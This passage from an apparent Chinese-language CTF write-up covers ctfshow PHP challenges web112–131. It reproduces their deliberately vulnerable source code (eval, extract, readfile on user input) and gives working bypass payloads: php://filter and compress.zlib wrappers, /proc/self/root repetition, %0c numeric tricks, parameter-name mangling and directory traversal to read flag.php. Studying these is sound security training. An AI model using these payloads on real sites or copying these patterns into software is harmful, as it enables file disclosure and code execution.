class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">    highlight_file(filter(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到本题看到过滤的没有php和filter就想到了php伪协议</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">is_file — 判断给定文件名是否为一个正常的文件</span><br><span class="line">is_file ( <span class="keyword">string</span> <span class="variable">$filename</span> ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>我们的目的是不能让is_file检测出是文件，并且 highlight_file可以识别为文件。这时候可以利用php伪协议。<br>可以直接用不带任何过滤器的filter伪协议</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/resource=flag.php</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:file=php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php</span></span><br><span class="line">file=compress.zlib:<span class="comment">//flag.php</span></span><br><span class="line">payload:file=php:<span class="comment">//filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span></span><br></pre></td></tr></table></figure><h2 id="web-113"><a href="#web-113" class="headerlink" title="web 113"></a>web 113</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-30 23:47:52</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">    highlight_file(filter(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p> compress.zlib://file.gz - 处理的是 ‘.gz’ 后缀的压缩包<br>    compress.bzip2://file.bz2 - 处理的是 ‘.bz2’ 后缀的压缩包<br>    zip://archive.zip#dir/file.txt - 处理的是 ‘.zip’ 后缀的压缩包里的文件</p></blockquote><p>   用上一题的非预期解：?file=compress.zlib://flag.php<br>预期解：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file=/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在linux中/proc/self/root是指向根目录的，也就是如果在命令行中输入ls /proc/self/root，其实显示的内容是根目录下的内容<br>多次重复从而绕过的原理不懂！</p><h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><p>filter没有过滤！！</p><h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 15:08:19</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> trim(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> filter(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125; hacker!!!</span><br></pre></td></tr></table></figure><p>本题考is_numeric（）和trim（）过滤<br>trim（）：匹配字符串<br>做个实验</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;<span class="number">128</span> ; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$x</span>=chr(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span>(is_numeric(<span class="variable">$x</span>)==<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> urlencode(chr(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果有除了数字和+-.号以外还有 %09 %0a %0b %0c %0d %20</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;=<span class="number">128</span> ; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$x</span>=chr(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span>(trim(<span class="variable">$x</span>)!==<span class="string">&#x27;1&#x27;</span> &amp;&amp;  is_numeric(<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> urlencode(chr(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果有+-.号以外还有只剩下%0c也就是换页符<br>则只有%0c可以同时绕过两个函数<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=%<span class="number">0</span>c36</span><br></pre></td></tr></table></figure><h2 id="web123、125、126"><a href="#web123、125、126" class="headerlink" title="web123、125、126"></a>web123、125、126</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到本题，发现首先一个难点就是让CTF_SHOW.COM绕过匹配，看到大佬博客后发现CTF[SHOW.COM可以绕过。之后有一个知识点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、cli模式（命令行）下</span><br><span class="line"></span><br><span class="line">第一个参数<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>][<span class="number">0</span>]是脚本名，其余的是传递给脚本的参数</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、web网页模式下</span><br><span class="line"></span><br><span class="line">在web页模式下必须在php.ini开启register_argc_argv配置项</span><br><span class="line"></span><br><span class="line">    设置register_argc_argv = On(默认是Off)，重启服务，<span class="variable">$_SERVER</span>[‘argv’]才会有效果</span><br><span class="line"></span><br><span class="line">    这时候的<span class="variable">$_SERVER</span>[‘argv’][<span class="number">0</span>] = <span class="variable">$_SERVER</span>[‘QUERY_STRING’]</span><br><span class="line"></span><br><span class="line">    <span class="variable">$argv</span>,<span class="variable">$argc</span>在web模式下不适用</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因为本题是在web条件下，所以我们可以用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[‘argv’][<span class="number">0</span>] = <span class="variable">$_SERVER</span>[‘QUERY_STRING’]<span class="comment">//即a[0]=$_SERVER[‘QUERY_STRING’]</span></span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/qiantuwuliang/archive/2010/02/28/1675279.html">$_SERVER[‘QUERY_STRING’]的用法</a><br>因此可以构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="variable">$fl0g</span>=flag_give_me;</span><br><span class="line">POST  CTF_SHOW=<span class="number">1</span>&amp;CTF[SHOW.COM=<span class="number">1</span>&amp;fun=<span class="keyword">eval</span>(<span class="variable">$a</span>[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-10 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-10 21:52:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = md5(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(waf(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到本题后发现和上一题相似，也是要绕过匹配的_</p><blockquote><p>extract（$array）：将数组中的键、值 变成 变量和值</p></blockquote><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf%<span class="number">5</span>bshow=ilove36d</span><br><span class="line">ctf show=ilove36d</span><br></pre></td></tr></table></figure><h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-10 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-12 19:49:05</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    var_dump(call_user_func(call_user_func(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>看到本题后一脸懵，看大佬博客</p><blockquote><p>call_user_func() ： 该函数‎是‎‎PHP‎‎中的一个内置函数，用于调用第一个参数给出的回调，并将其余参数作为参数传递。它用于调用用户定义的函数。‎</p></blockquote><p>在开启gettext拓展后，有_()==gettext()   ，开启text扩展。需要php扩展目录下有php_gettext.dll<br>在开启该拓展后 _() 等效于 gettext()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> gettext(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line">结果  phpinfo</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> _(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line">结果 phpinfo</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以 call_user_func(‘_’,’phpinfo’) 返回的就是phpinfo<br>因为我们要得到的flag就在flag.php中，所以可以直接用get_defined_vars</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars ( <span class="keyword">void</span> ) : <span class="keyword">array</span></span><br><span class="line">此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</span><br></pre></td></tr></table></figure><p>则payload：?f1=_&amp;&amp;f2=get_defined_vars</p><h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-13 03:18:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> readfile(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>stripos()：查找字符串在另一字符串中第一次出现的位置（不区分大小写）</p></blockquote><p>可以用服务器进行远程文件包含或者用伪协议<br>filter伪协议支持多种编码方式，无效的就被忽略掉了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f=php:<span class="comment">//filter/read=convert.base64-encode|ctfshow/resource=flag.php</span></span><br></pre></td></tr></table></figure><p>目录穿越也可以以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f=/ctfshow/../../../../../../../<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure><h2 id="web130-131"><a href="#web130-131" class="headerlink" title="web130~131"></a>web130~131</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span 